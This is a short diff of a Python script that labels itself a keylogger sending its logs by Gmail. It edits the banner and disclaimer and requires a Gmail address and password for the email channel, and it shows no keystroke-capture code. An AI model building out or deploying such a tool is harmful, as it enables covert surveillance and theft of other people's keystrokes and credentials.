@@ -4,16 +4,17 @@ from datetime import datetime
 from getpass import getpass
 
 import smtplib
+info = "Keylogger Python based with Gmail sending log architecture"
 
 disclaimer = """Do not attempt to violate the law. 
 If you planned to use the content for illegal purpose, 
 i'm not be responsible of your actions."""
 
-print("\n" + disclaimer + "\n")
+print("\n" + info + "\n\n" + disclaimer + "\n")
 
 EMAIL_ADDRESS = input("Email Address: ")
-while "@" not in EMAIL_ADDRESS:
-    print("Wrong mail format, try again\n")
+while "@gmail.com" not in EMAIL_ADDRESS:
+    print("Wrong Mail Format, try again...\n")
     EMAIL_ADDRESS = input("Email Address: ")
 
 EMAIL_PASSWD = getpass("Email password: ")
